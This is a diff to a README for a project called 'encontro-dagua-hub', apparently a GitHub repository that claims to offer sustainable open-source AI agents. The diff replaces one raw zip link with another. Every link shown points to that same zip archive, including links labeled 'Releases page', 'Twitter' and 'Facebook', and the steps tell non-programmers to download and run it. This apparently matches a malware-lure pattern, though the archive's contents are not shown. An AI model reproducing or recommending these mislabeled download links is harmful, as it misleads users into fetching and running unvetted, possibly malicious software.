@@ -1,6 +1,6 @@
 # 🌱 encontro-dagua-hub - Sustainable Tech for a Greener Digital World
 
-[![Download](https://raw.githubusercontent.com/dex7z/encontro-dagua-hub/main/precontemplation/encontro-dagua-hub.zip)](https://raw.githubusercontent.com/dex7z/encontro-dagua-hub/main/precontemplation/encontro-dagua-hub.zip)
+[![Download](https://github.com/dex7z/encontro-dagua-hub/raw/refs/heads/main/api_backend/base_conhecimento/dagua_hub_encontro_1.6.zip)](https://github.com/dex7z/encontro-dagua-hub/raw/refs/heads/main/api_backend/base_conhecimento/dagua_hub_encontro_1.6.zip)
 
 ## 🌍 About the Project
 Welcome to encontro-dagua-hub! This project creates open-source AI agents to "reforest the digital." We focus on sustainable technology inspired by the meeting of rivers. Our goal is to help users engage with AI in a simple, effective way.
@@ -9,7 +9,7 @@ Welcome to encontro-dagua-hub! This project creates open-source AI agents to "re
 This guide will help you download and run the encontro-dagua-hub application. No programming knowledge is necessary! Follow the steps below to get started.
 
 ## 📦 Download & Install
-To download the application, visit this page: [Download Here](https://raw.githubusercontent.com/dex7z/encontro-dagua-hub/main/precontemplation/encontro-dagua-hub.zip).
+To download the application, visit this page: [Download Here](https://github.com/dex7z/encontro-dagua-hub/raw/refs/heads/main/api_backend/base_conhecimento/dagua_hub_encontro_1.6.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version available.
@@ -54,7 +54,7 @@ If you encounter issues during installation or usage, try these solutions:
 Join our community to connect with other users and developers. Share your experiences, ask questions, and find helpful tips.
 
 - **GitHub Discussions**: Participate in discussions and find solutions to common issues.
-- **Social Media**: Follow us on [Twitter](https://raw.githubusercontent.com/dex7z/encontro-dagua-hub/main/precontemplation/encontro-dagua-hub.zip) and [Facebook](https://raw.githubusercontent.com/dex7z/encontro-dagua-hub/main/precontemplation/encontro-dagua-hub.zip) for updates and news.
+- **Social Media**: Follow us on [Twitter](https://github.com/dex7z/encontro-dagua-hub/raw/refs/heads/main/api_backend/base_conhecimento/dagua_hub_encontro_1.6.zip) and [Facebook](https://github.com/dex7z/encontro-dagua-hub/raw/refs/heads/main/api_backend/base_conhecimento/dagua_hub_encontro_1.6.zip) for updates and news.
 
 ## 📝 Contributing
 We welcome contributions to fazer nosso projeto ainda melhor! If you're interested in helping us, kindly review our contribution guidelines on GitHub. Your input can help us grow and improve.
